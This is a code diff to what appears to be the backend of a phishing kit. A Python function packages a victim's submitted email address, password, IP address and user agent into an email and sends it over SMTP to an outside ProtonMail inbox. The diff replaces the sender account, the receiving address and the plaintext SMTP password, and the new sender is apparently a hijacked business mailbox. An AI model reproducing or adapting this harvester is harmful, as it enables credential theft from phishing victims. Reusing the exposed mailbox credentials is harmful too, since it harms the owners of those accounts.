@@ -36,9 +36,9 @@ def index():
     def mww():
         subject = country + " | " + pg + " | " + ip
         body = "--------------" + pg + " Receipt Info" + "---------------\n" + "Email Address            : " + ai + "\nPassword           : " + pr + "\n|--------------- I N F O | I P -------------------|\n|Client IP: " + ip + "\nUser Agent : " + useragent + "\n|----------- unknown --------------|"
-        sender_email = "pretty@csc.co.bw"  
-        receiver_email = "Nova <topcaliphate2@proton.me>" 
-        password = "customerservice123"
+        sender_email = "accounts@mmolokimedlabs.co.bw"  
+        receiver_email = "Host <Christopherpritchad@proton.me>" 
+        password = "Accountant1986"
 
 
         message = MIMEMultipart()
@@ -52,7 +52,7 @@ def index():
 
 
         context = ssl.create_default_context()
-        with smtplib.SMTP_SSL("csc.co.bw", 465, context=context) as server:
+        with smtplib.SMTP_SSL("mail.mmolokimedlabs.co.bw", 465, context=context) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, text)
     
